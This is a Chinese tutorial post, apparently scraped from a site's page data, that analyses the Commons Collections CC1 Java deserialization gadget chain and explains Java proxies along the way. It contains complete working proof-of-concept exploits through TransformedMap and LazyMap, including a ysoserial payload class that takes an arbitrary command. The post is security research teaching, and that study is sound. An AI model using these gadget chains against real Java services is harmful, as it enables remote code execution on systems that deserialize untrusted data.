ysoserial的cc1",normalizedTitle:"ysoserial的cc1",charIndex:18608},{level:3,title:"LazyMap",slug:"lazymap",normalizedTitle:"lazymap",charIndex:12419},{level:3,title:"两个小细节",slug:"两个小细节",normalizedTitle:"两个小细节",charIndex:22067},{level:2,title:"参考资料",slug:"参考资料",normalizedTitle:"参考资料",charIndex:22337}],excerpt:'<h1 id="cc1利用链分析"><a class="header-anchor" href="#cc1利用链分析">#</a> CC1利用链分析</h1>\n<p align="center">\n  <img src="https://pic3.zhimg.com/80/v2-e8765519b71da2e4e80d93885fa7cd2e_1440w.jpg" width="500">\n</p>\n<p>CC1链是CommonsCollections的第一条gadget Chain，也是Java反序列化的开篇。</p>\n',headersStr:"背景 复现环境 分析 Java执行命令 使用InvokerTRansformer执行命令 解决Runtime不可序列化的问题 包装chainedTransformer 向上寻找 基于TransformedMap的CC1 Java代理 静态代理 动态代理 Ysoserial的CC1 LazyMap 两个小细节 参考资料",content:'# CC1利用链分析\n\n\n\nCC1链是CommonsCollections的第一条gadget Chain，也是Java反序列化的开篇。\n\n\n# 背景\n\nApache Commons Collections是一个扩展了Java标准库里的Collection结构的第三方基础库。在企业项目和常见的中间件中使用十分的广泛。并且由于它是集合类的一个拓展，因此和集合类似，他的参数往往是Object类型，十分的方便构建反序列化利用链。2015年，FoxGlove Security团队发现并发表了利用Commons Collections进行反序列化导致远程命令执行的长篇博客，由此也引起了国内外安全人员对于Java反序列化漏洞的重视和研究。CommonsCollections1作为Java反序列化利用链中最基础的链，搞清楚这条链的利用过程和原理，对于深入了解反序列化漏洞和研究其他利用链有很大的帮助。\n\n\n# 复现环境\n\nJDK版本：jdk8u65\n\nCommonsCollections : <= 3.2.1\n\nsun源码下载地址：http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/af660750b2f4\n\n> 注： 因为在jdk的源码中不包含sun包下的源码，我们进行搜索时找不到sun包下的源码。因此需要将sun的源码添加到jdk目录下的src.zip中。\n\n\n# 分析\n\n根据FoxGlove Security的博客，CC1链能够成功利用是因为在Transformer(接口)的实现类InvokerTransformer中的transform方法中使用反射进行进行类的创建和方法的调用，并且我们可以控制调用方法的名称、参数和传入的类的对象。如下代码所示：\n\npublic Object transform(Object input) {\n    if (input == null) {\n        return null;\n    }\n    try {\n        Class cls = input.getClass();\n        Method method = cls.getMethod(iMethodName, iParamTypes);\n        return method.invoke(input, iArgs);\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n那么我们就从这里入手，一步一步回推到利用链的开始位置：readObject\n\n\n# Java执行命令\n\n在Java中有三种执行系统命令的方式，分别是Runtime.getRuntime.exec、ProcessBuilder和ProcessImpl。ProcessImpl方式是前两种方式的底层实现，并不提供给用户调用，但是我们可以利用反射来调用执行系统的命令。在这篇文章中就使用最简单的Runtime来执行命令。\n\n在正常情况下，我们使用如下的命令来执行命令：\n\nRuntime.getRuntime().exec("calc");\n\n\n1\n\n\n这里使用Runtime的静态方法getRuntime方法获取到一个Runtime对象，然后调用exec方法，执行exec方法中的命令，打开一个计算器。之所以不用new直接创建对象，和Runtime的单例模式有关系。在Runtime类中，构造器为私有的，只提供了一个getRuntime方法获取对象。当然我们也可以使用反射来创建对象，这里就不再说明了。\n\n由于我们需要利用transform方法中的反射来执行系统命令，因此我们将上面的写法用Java反射实现：\n\nClass<Runtime> clazz = Runtime.class;\nMethod getRuntimeMethod = clazz.getMethod("getRuntime");\nRuntime runtime = (Runtime) getRuntimeMethod.invoke(null, null);\nMethod execMethod = clazz.getMethod("exec", String.class);\nexecMethod.invoke(runtime,"calc");\n\n\n1\n2\n3\n4\n5\n\n\n具体为什么要这么写，在另一篇《java反序列化 - 反射》的文章中有说明，这里不在介绍。\n\n\n# 使用InvokerTRansformer执行命令\n\npublic Object transform(Object input) {\n    if (input == null) {\n        return null;\n    }\n    try {\n        Class cls = input.getClass();\n        Method method = cls.getMethod(iMethodName, iParamTypes);\n        return method.invoke(input, iArgs);\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n在InvokerTransformer类的transform方法中，input是我们传入的想要反射的类，通过getClass获取到类对象。然后调用getMethod方法，传入方法名称、参数类型，最后调用方法的invoke，传入执行方法的对象、方法的参数执行该方法。其中方法名称、参数类型、参数均可以在创建InvokerTransformer对象时，使用构造器设置。对照上面我们自己编写的反射执行系统命令的写法，我们知道input是Runtime的对象，iMethodName是exec，iParamTypes是String.class，iArgs是calc。于是我们就有了如下的写法：\n\nInvokerTransformer invokerTransformer = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});\nClass clazz = Runtime.class;\nMethod getRuntime = clazz.getMethod("getRuntime");\nRuntime runtime = (Runtime) getRuntime.invoke(null);\ninvokerTransformer.transform(runtime);\n\n\n1\n2\n3\n4\n5\n\n\n\n# 解决Runtime不可序列化的问题\n\n想要序列化一个类，需要这个类实现Serializable接口，Runtime没有实现该接口，因此无法进行序列化，最终导致无法进行命令执行。因此，我们需要对Runtime的写法进行改造：\n\nClass<Runtime> clazz = Runtime.class;\nMethod runtimeMethod = (Method) new InvokerTransformer(\n    "getMethod",\n    new Class[]{String.class,Class[].class},\n    new Object[]{"getRuntime",null})\n    .transform(clazz);\nRuntime runtime =(Runtime) new InvokerTransformer(\n    "invoke",\n    new Class[]{Object.class, Object[].class},\n    new Object[]{null,null})\n    .transform(runtimeMethod);\nnew InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"}).transform(runtime);\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n传入的Class类对象是可以被反序列化的，因此传入Runtime的类对象，利用反射调用类对象的getMethod方法，获取到该方法之后，在利用反射调用getRuntime方法对象的invoke方法，获取到Runtime对象。最后在利用InvokerTransformer调用exec方法，调用系统命令。这种方法十分巧妙的解决了Runtime对象无法序列化的问题，这种写法在后续的反序列化链中也十分常见。\n\n\n# 包装chainedTransformer\n\n我们上面的写法创建了三个InvokerTransformer对象，需要每个都执行他的transform方法，这样过于麻烦。Transformer接口还有一个实现类ChainedTransformer，该类可以将Transformer对象数组包装成一个chainedTransformer，调用transform方法时，会链式调用每个Transformer对象的transform方法。如下图所示：\n\n\n\n因此，对我们编写的代码进行包装，然后调用transform方法，执行的结果和上面一致：\n\nTransformer[] transformers = new Transformer[]{\n    new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),\n    new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),\n    new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})\n};\n\nChainedTransformer chainedTransformer = new ChainedTransformer(transformers);\n\nchainedTransformer.transform(Runtime.class);\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n到这之后，我们基本的Transformer就算构建完成了，我们需要网上寻找哪里调用过transform方法。\n\n\n# 向上寻找\n\n可以利用Idea的Find Usages找到现有的Java源码中调用过该方法的位置，这也是为什么我们需要将sun包下的源码放入jdk目录下的src.zip中。如果没有sun的源码，后面这条链就会断掉。\n\n\n\n在查找的结果中，我们发现org.apache.commons.collections.map.TransformedMap类下的checkSetValue方法的valueTransformer对象调用了transform方法。\n\nprotected Object checkSetValue(Object value) {\n    return valueTransformer.transform(value);\n}\n\n\n1\n2\n3\n\n\n而valueTransformer对象是我们可以控制的。也就是说，如果valueTransformer对象是我们创建的chainedTransformer对象，调用transform方法就可以执行系统命令了。我们先来看一下valueTransformer从哪里来的。\n\nprotected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) {\n    super(map);\n    this.keyTransformer = keyTransformer;\n    this.valueTransformer = valueTransformer;\n}\n\n\n1\n2\n3\n4\n5\n\n\n在这个类的构造器中，valueTransformer是由我们传入的，那么我们是不是就可以调用构造器直接把chainedTransformer的值赋值给valueTransformer呢？是不行的，因为这个构造器是protected的，我们没有办法直接进行调用。那么我们就看一看，是谁调用了这个构造器。\n\n我们找到，在这个类中存在一个public 的静态方法（可以使用类名直接调用）decorate。我们传入该方法的valueTransformer参数，将直接带入到构造器中。\n\npublic static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) {\n    return new TransformedMap(map, keyTransformer, valueTransformer);\n}\n\n\n1\n2\n3\n\n\n于是我们可以这样进行构建：\n\nHashMap<Object, Object> map = new HashMap<>();\nmap.put("aaa","bbb");\nMap<Object,Object> decoratedMap = TransformedMap.decorate(map, null, chainedTransformer);\n\n\n1\n2\n3\n\n\n这样我们就将decoratedMap对象中的chainedTransformer对象赋值为了chainedTransformer。当chainedTransformer调用transform方法，实际上就是chainedTransformer调用transform方法，就会弹出计算器。\n\n于是我们继续向上找，哪里调用了checkSetValue方法。\n\n在org.apache.commons.collections.map.TransformedMap类的父类中有一个静态内部类，当我们使用foreach循环遍历Map的entity并给entity设置值时会调用checkSetValue方法。setValue的参数是Object类型的对象，该值会传递给checkSetValue方法，最后传递给transform方法。\n\nstatic class MapEntry extends AbstractMapEntryDecorator {\n\n    /** The parent map */\n    private final AbstractInputCheckedMapDecorator parent;\n\n    protected MapEntry(Map.Entry entry, AbstractInputCheckedMapDecorator parent) {\n        super(entry);\n        this.parent = parent;\n    }\n\n    public Object setValue(Object value) {\n        value = parent.checkSetValue(value);\n        return entry.setValue(value);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n于是我们可以这样构造，遍历装饰过的chainedTransformer对象。并且调用setValue方法。就可以调用到tansfrom方法。\n\nfor (Map.Entry entry : decoratedMap.entrySet()){\n    entry.setValue(Runtime.class);\n}\n\n\n1\n2\n3\n\n\n至此，我们已经完成了大部分的利用链的寻找，下一步就是寻找哪里调用过setValue，并且可以控制传入的参数。最好是readObject调用过，这样在进行反序列化的时候就可以直接激活整条利用链了。\n\n我们依然使用Idea的Find Usages寻找，最终在sun包下的sun.reflect.annotation.AnnotationInvocationHandler的readObject方法中调用了setValue方法。\n\nprivate void readObject(java.io.ObjectInputStream s)\n    throws java.io.IOException, ClassNotFoundException {\n    s.defaultReadObject();\n\n    // Check to make sure that types have not evolved incompatibly\n\n    AnnotationType annotationType = null;\n    try {\n        annotationType = AnnotationType.getInstance(type);\n    } catch(IllegalArgumentException e) {\n        // Class is no longer an annotation type; time to punch out\n        throw new java.io.InvalidObjectException("Non-annotation type in annotation serial stream");\n    }\n\n    Map<String, Class<?>> memberTypes = annotationType.memberTypes();\n\n    // If there are annotation members without values, that\n    // situation is handled by the invoke method.\n    for (Map.Entry<String, Object> memberValue : memberValues.entrySet()) {\n        String name = memberValue.getKey();\n        Class<?> memberType = memberTypes.get(name);\n        if (memberType != null) {  // i.e. member still exists\n            Object value = memberValue.getValue();\n            if (!(memberType.isInstance(value) ||\n                  value instanceof ExceptionProxy)) {\n                memberValue.setValue(\n                    new AnnotationTypeMismatchExceptionProxy(\n                        value.getClass() + "[" + value + "]").setMember(\n                        annotationType.members().get(name)));\n            }\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n\n\n其中的memberValues是可以通过构造方法传递进去的。但是AnnotationInvocationHandler类并非public，也无法直接获取对象，我们需要使用反射获取到该类的对象。在构造器中传入一个注解类型的类对象，和我们上面构造的decoratedMap，在反序列化的时候就会调用该类的readObject方法，遍历decoratedMap，调用setValue。\n\nClass<?> clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");\nConstructor<?> declaredConstructor = clazz.getDeclaredConstructor(Class.class, Map.class);\ndeclaredConstructor.setAccessible(true);\nObject o = declaredConstructor.newInstance(Overide.class, decoratedMap);\n\ndeserialize(o,"test.ser");\nObject serialize = serialize("test.ser");\nSystem.out.println(serialize);\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n但是有两点需要注意的是：\n\n 1. 当if判断通过后才能执行\n 2. setValue的值我们并不可控，并不能传入Runtime.class\n\n我们先看一下if判断的问题，if判断memberType不等于null时才继续执行。memberType的值的获取方式是:\n\n1. 获取我们传入的map的key -- 这里是 aaa\n2. 然后获取我们传入的注解类的同名值 --- Override中没有参数 因此获取不到\n3. 然后判断获取到的memberType是不是空的 --- 是空的 于是执行不到setVlaue\n\n\n1\n2\n3\n\n\n于是我们需要将最先的HashMap中的aaa修改为一个注解中存在的值，由于Overide不存在任何的属性，因此我们修改使用Target注解。\n\n……\nmap.put("value","bbb");\n……\nObject o = declaredConstructor.newInstance(Target.class, decoratedMap);\n\n\n1\n2\n3\n4\n\n\n这样的话，if判断就可以通过了。\n\n现在来解决第二个问题，我们无法控制setValue的参数。setValue的参数是Runtime.class类对象，最终需要传递给transform方法。我们无法控制的话，就无法执行命令。解决方法如下：\n\nTransformer接口有另一个实现类：org.apache.commons.collections.functors.ConstantTransformer\n\n该类在创建时需要传递进去一个Object类型的参数，在执行完该类的transform方法之后，会将我们传递进去的参数返回。如果将其置于chainedTransformer最前面，后续的transfrom方法的参数都将是我们设置的Object类型的参数。\n\nTransformer[] transformers = new Transformer[]{\n    new ConstantTransformer(Runtime.class),\n    new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),\n    new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),\n    new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})\n};\n\n\n1\n2\n3\n4\n5\n6\n\n\n解决了上面两个问题，在对最终的对象进行反序列化时，就会调用该对象的readObject方法，然后调用后续的一系列方法，最终执行系统命令。完整的poc如下：\n\npublic class CC1 {\n    public static void main(String[] args) throws Exception {\n        Transformer[] transformers = new Transformer[]{\n            new ConstantTransformer(Runtime.class),\n            new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),\n            new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),\n            new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})\n        };\n\n        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);\n        HashMap<Object, Object> map = new HashMap<>();\n        map.put("value","bbb");\n        Map<Object,Object> decoratedMap = TransformedMap.decorate(map, null, chainedTransformer);\n        for (Map.Entry entry : decoratedMap.entrySet()){\n            entry.setValue(Runtime.class);\n        }\n\n        Class<?> clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");\n        Constructor<?> declaredConstructor = clazz.getDeclaredConstructor(Class.class, Map.class);\n        declaredConstructor.setAccessible(true);\n        Object o = declaredConstructor.newInstance(Target.class, decoratedMap);\n\n        deserialize(o,"test.ser");\n        Object serialize = serialize("test.ser");\n        System.out.println(serialize);\n\n    }\n\n    private static void deserialize(Object o,String fileName) throws Exception{\n        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(fileName));\n        objectOutputStream.writeObject(o);\n    }\n\n    private static Object serialize(String fileName) throws Exception{\n        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(fileName));\n        return ois.readObject();\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n\n\n我们再来梳理一下调用链：\n\n- 系统存在一个反序列化点\n\t- 传递我们构造的对象， 调用对象的readObject方法进行反序列化\n\t\t- readObject中调用了setValue方法\n\t\t\t- setValue方法中调用了checkSetValue方法\n\t\t\t\t- checkSetValue方法中调用transform\n\t\t\t\t\t- transform方法中利用反射执行系统命令\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 基于TransformedMap的CC1\n\n在ysoserial中使用的时LazyMap，本质上和我们这个类似。并且在ysoserial中大量的使用到了封装。\n\nfinal Map lazyMap = LazyMap.decorate(innerMap, transformerChain);\n\n\n1\n\n\n我们可以将我们这个链也用ysoserial的方式实现一遍。\n\npackage ysoserial.payloads;\n\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.ChainedTransformer;\nimport org.apache.commons.collections.functors.ConstantTransformer;\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.map.LazyMap;\nimport org.apache.commons.collections.map.TransformedMap;\nimport ysoserial.payloads.annotation.Authors;\nimport ysoserial.payloads.annotation.Dependencies;\nimport ysoserial.payloads.annotation.PayloadTest;\nimport ysoserial.payloads.util.Gadgets;\nimport ysoserial.payloads.util.JavaVersion;\nimport ysoserial.payloads.util.PayloadRunner;\n\nimport java.lang.annotation.Target;\nimport java.lang.reflect.Constructor;\nimport java.lang.reflect.InvocationHandler;\nimport java.util.HashMap;\nimport java.util.Map;\n\n@SuppressWarnings({"rawtypes", "unchecked"})\n@PayloadTest( precondition = "isApplicableJavaVersion")\n@Dependencies({"commons-collections:commons-collections:3.1"})\n@Authors({ Authors.FROHOFF })\npublic class CC1 extends PayloadRunner implements ObjectPayload<InvocationHandler> {\n\n\n  @Override\n  public InvocationHandler getObject(final String command) throws Exception {\n\n\n    final Transformer[] transformers = new Transformer[]{\n      new ConstantTransformer(Runtime.class),\n      new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),\n      new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),\n      new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{command})\n    };\n    final Map innerMap = new HashMap();\n    innerMap.put("value","123");\n\n    final Transformer transformerChain = new ChainedTransformer(transformers);\n\n    final Map transformedMap = TransformedMap.decorate(innerMap, null ,transformerChain);\n\n    Class<?> clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");\n    Constructor<?> declaredConstructor = clazz.getDeclaredConstructor(Class.class, Map.class);\n    declaredConstructor.setAccessible(true);\n    final InvocationHandler handler = (InvocationHandler) declaredConstructor.newInstance(Target.class, transformedMap);\n\n    return handler;\n  }\n\n\n\n  public static void main(final String[] args) throws Exception {\n    PayloadRunner.run(CommonsCollections1.class, args);\n  }\n\n  public static boolean isApplicableJavaVersion() {\n    return JavaVersion.isAnnInvHUniversalMethodImpl();\n  }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n\n\n然后我们就可以使用ysoserial创建序列化文件了。\n\n\n# Java代理\n\n代理设计模式是Java中非常常用的设计模式之一。所谓代理设计模式，就是客户端并不直接调用实际的方法，而是生成该类的代理对象，调用代理对象的指定方法，然后再由代理对象去调用实际的对象。类似于中间商。\n\n\n\n代理设计模式有两种实现方式：\n\n * 静态代理\n * 动态代理\n\n\n# 静态代理\n\n静态代理的实现原理是：创建一个接口类，让实际的类和代理类分别去实现这个接口。然后创建代理类的对象，调用代理类中实现的方法，在代理类方法中再调用实际的方法。代码演示如下：\n\n// 接口\npackage com.pwddd.proxy;\n\npublic interface IUser {\n  void show();\n\n  void eat();\n\n  void run();\n}\n\n\n// 具体实现\npackage com.pwddd.proxy;\n\npublic class UserImpl implements IUser{\n  @Override\n  public void show() {\n    System.out.println("userImpl .... show");\n  }\n\n  @Override\n  public void eat() {\n    System.out.println("userImpl .... eat");\n  }\n\n  @Override\n  public void run() {\n    System.out.println("userImpl .... run");\n  }\n}\n\n// 代理实现\npackage com.pwddd.proxy;\n\npublic class UserProxy implements IUser{\n\n  private UserImpl user;\n\n  public UserProxy() {\n  }\n\n  public UserProxy(UserImpl user) {\n    this.user = user;\n  }\n\n  @Override\n  public void show() {\n    System.out.println("proxy show");\n    user.show();\n  }\n\n  @Override\n  public void eat() {\n    System.out.println("proxy show");\n    user.eat();\n  }\n\n  @Override\n  public void run() {\n    System.out.println("proxy show");\n    user.run();\n  }\n}\n\n\n// 测试方法\npackage com.pwddd.proxy;\n\npublic class ProxyTest {\n  public static void main(String[] args) {\n    UserProxy userProxy = new UserProxy(new UserImpl());\n    userProxy.show();\n  }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n\n\n通过静态代理的方式，当我们想要调用show方法时，实际上调用的是代理类的show方法，在代理类中做相应的处理操作后，在调用实际的方法。这种静态代理的弊端就是当需要代理的类的方法修改时，对应的具体实现和代理类均需要被修改才能正常使用。\n\n下面介绍一种在框架中大量使用的动态代理。\n\n\n# 动态代理\n\n静态代理的类在程序运行之前就进行了编译。而动态代理并不是在Java代码中定义的，而是在运行时创建代理类的对象。相比于静态代理， 动态代理的优势在于可以很方便的对代理类的函数进行统一的处理，而不用修改每个代理类中的方法。\n\n在java的java.lang.reflect包下提供了一个Proxy类和一个InvocationHandler接口，通过这个类和这个接口可以生成JDK动态代理类和动态代理对象。\n\n创建一个执行处理器类实现InvocationHandler接口。\n\npackage com.pwddd.proxy.dynamic;\n\nimport java.lang.reflect.InvocationHandler;\nimport java.lang.reflect.Method;\n\npublic class MyInvocationHandler<T> implements InvocationHandler {\n\n  T target;\n\n  public MyInvocationHandler() {\n  }\n\n  public MyInvocationHandler(T target) {\n    this.target = target;\n  }\n\n  @Override\n  public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {\n    System.out.println(method.getName()+"------------------");\n    Object object = method.invoke(target, args);\n\n    return object;\n  }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n创建测试动态代理\n\npackage com.pwddd.proxy.dynamic;\n\nimport com.pwddd.proxy.staticproxy.IUser;\nimport com.pwddd.proxy.staticproxy.UserImpl;\n\nimport java.lang.reflect.InvocationHandler;\nimport java.lang.reflect.Proxy;\n\npublic class TestDynamicProxy {\n  public static void main(String[] args) {\n    IUser user = new UserImpl();\n    InvocationHandler handler = new MyInvocationHandler<>(user);\n\n    IUser userProxy = (IUser) Proxy.newProxyInstance(\n      user.getClass().getClassLoader(),\n      user.getClass().getInterfaces(),\n      handler);\n    userProxy.eat();\n\n  }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n我们首先创建了一个InvocationHandler类，并且在该类的构造方法中传递进去我们要代理的具体类的对象。重写invoke方法，在该方法中添加代理的方法，并利用反射调用实际类的方法。使用Proxy.newProxyInstance创建代理类的对象，使用代理类对象调用方法。\n\n\n# Ysoserial的CC1\n\n\n# LazyMap\n\n我们在上面说到，ysoserial的CC1使用的是LazyMap，而我们构建的链使用的是TransformedMap，这两者在哪些地方有区别呢？我们接下来就来看一下。\n\n我们可以看到，LazyMap在get方法中调用了transform方法，因此我们可以尝试构造以下代码，测试是否能够执行系统命令。\n\nTransformer[] transformers = new Transformer[]{\n    new ConstantTransformer(Runtime.class),\n    new InvokerTransformer("getMethod", \n                           new Class[]{String.class,Class[].class}, \n                           new Object[]{"getRuntime",new Class[0]}),\n    new InvokerTransformer("invoke", \n                           new Class[]{Object.class,Object[].class}, \n                           new Object[]{null, new Object[0]}),\n    new InvokerTransformer("exec", \n                           new Class[]{String.class},\n                           new String[]{"calc"}),\n};\n\nChainedTransformer chainedTransformer = new ChainedTransformer(transformers);\nHashMap<Object, Object> innerMap = new HashMap<>();\ninnerMap.put("value", "test");\nMap outerMap = LazyMap.decorate(innerMap, chainedTransformer);\nouterMap.get(Runtime.getRuntime());\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n经过测试，发现是可以进行命令执行的，那么就需要继续往上寻找，哪里调用过set方法。最终在AnnotationInvokerHandler中的invoke方法中找到了调用：\n\npublic Object invoke(Object proxy, Method method, Object[] args) {\n    String member = method.getName();\n    Class<?>[] paramTypes = method.getParameterTypes();\n\n    // Handle Object and Annotation methods\n    if (member.equals("equals") && paramTypes.length == 1 &&\n        paramTypes[0] == Object.class)\n        return equalsImpl(args[0]);\n    if (paramTypes.length != 0)\n        throw new AssertionError("Too many parameters for an annotation method");\n\n    switch(member) {\n        case "toString":\n            return toStringImpl();\n        case "hashCode":\n            return hashCodeImpl();\n        case "annotationType":\n            return type;\n    }\n\n    // Handle annotation member accessors\n    Object result = memberValues.get(member);\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n但是遗憾的是，在AnnotationInvokerHandler的readObject方法中并没有调用过invoke方法。那么ysoserial提供的方法是使用动态代理，这样的话如果调用了readObject方法，并且在readObject方法中调用了对象的任意方法，就会触发代理类的invoke方法，导致命令执行。\n\n完整的LazyMap CC1链如下：\n\nTransformer[] transformers = new Transformer[]{\n  new ConstantTransformer(Runtime.class),\n  new InvokerTransformer(\n    "getMethod",\n    new Class[]{String.class,Class[].class},\n    new Object[]{"getRuntime",new Class[0]}\n  ),\n\n  new InvokerTransformer(\n    "invoke",\n    new Class[]{Object.class,Object[].class},\n    new Object[]{null,new Object[0]}\n  ),\n\n  new InvokerTransformer(\n    "exec",\n    new Class[]{String.class},\n    new Object[]{"/System/Applications/Calculator.app/Contents/MacOS/Calculator"}\n  )\n};\n\nChainedTransformer chainedTransformer = new ChainedTransformer(transformers);\nHashMap innerMap = new HashMap();\ninnerMap.put("value","xxx");\nMap outerMap = LazyMap.decorate(innerMap,chainedTransformer);\n\nClass clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");\nConstructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);\nconstructor.setAccessible(true);\nInvocationHandler instance = (InvocationHandler) constructor.newInstance(Retention.class, outerMap);\n\nMap proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[]{Map.class}, instance);\ninstance = (InvocationHandler) constructor.newInstance(Retention.class, proxyMap);\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\n\n# 两个小细节\n\n在运行上述poc的时候，可能会出现同时打开多个计算器。这种问题的原因是我们生成了代理类的对象，那么当每次被代理类的方法被调用时，都会执行代理类的invoke方法，从而导致弹出计算器。ysoserial为了避免这个问题，特意将transformers数组最后才放置到transformerchains中。\n\n\n\n另外一个就是ysoserial的Transformer数组在最终添加了一个ConstantTransformer(1)。根据P神在Java安全漫谈中的解释，是为了隐藏异常日志中的一些信息。我们这里不做深究。\n\n\n# 参考资料\n\n代码审计知识星球 - Java安全漫谈：https://wx.zsxq.com/dweb2/index/group/2212251881\n\n白日梦组长 Bilibili ： https://space.bilibili.com/2142877265',normalizedContent:'# cc1利用链分析\n\n\n\ncc1链是commonscollections的第一条gadget chain，也是java反序列化的开篇。\n\n\n# 背景\n\napache commons collections是一个扩展了java标准库里的collection结构的第三方基础库。在企业项目和常见的中间件中使用十分的广泛。并且由于它是集合类的一个拓展，因此和集合类似，他的参数往往是object类型，十分的方便构建反序列化利用链。2015年，foxglove security团队发现并发表了利用commons collections进行反序列化导致远程命令执行的长篇博客，由此也引起了国内外安全人员对于java反序列化漏洞的重视和研究。commonscollections1作为java反序列化利用链中最基础的链，搞清楚这条链的利用过程和原理，对于深入了解反序列化漏洞和研究其他利用链有很大的帮助。\n\n\n# 复现环境\n\njdk版本：jdk8u65\n\ncommonscollections : <= 3.2.1\n\nsun源码下载地址：http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/af660750b2f4\n\n> 注： 因为在jdk的源码中不包含sun包下的源码，我们进行搜索时找不到sun包下的源码。因此需要将sun的源码添加到jdk目录下的src.zip中。\n\n\n# 分析\n\n根据foxglove security的博客，cc1链能够成功利用是因为在transformer(接口)的实现类invokertransformer中的transform方法中使用反射进行进行类的创建和方法的调用，并且我们可以控制调用方法的名称、参数和传入的类的对象。如下代码所示：\n\npublic object transform(object input) {\n    if (input == null) {\n        return null;\n    }\n    try {\n        class cls = input.getclass();\n        method method = cls.getmethod(imethodname, iparamtypes);\n        return method.invoke(input, iargs);\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n那么我们就从这里入手，一步一步回推到利用链的开始位置：readobject\n\n\n# java执行命令\n\n在java中有三种执行系统命令的方式，分别是runtime.getruntime.exec、processbuilder和processimpl。processimpl方式是前两种方式的底层实现，并不提供给用户调用，但是我们可以利用反射来调用执行系统的命令。在这篇文章中就使用最简单的runtime来执行命令。\n\n在正常情况下，我们使用如下的命令来执行命令：\n\nruntime.getruntime().exec("calc");\n\n\n1\n\n\n这里使用runtime的静态方法getruntime方法获取到一个runtime对象，然后调用exec方法，执行exec方法中的命令，打开一个计算器。之所以不用new直接创建对象，和runtime的单例模式有关系。在runtime类中，构造器为私有的，只提供了一个getruntime方法获取对象。当然我们也可以使用反射来创建对象，这里就不再说明了。\n\n由于我们需要利用transform方法中的反射来执行系统命令，因此我们将上面的写法用java反射实现：\n\nclass<runtime> clazz = runtime.class;\nmethod getruntimemethod = clazz.getmethod("getruntime");\nruntime runtime = (runtime) getruntimemethod.invoke(null, 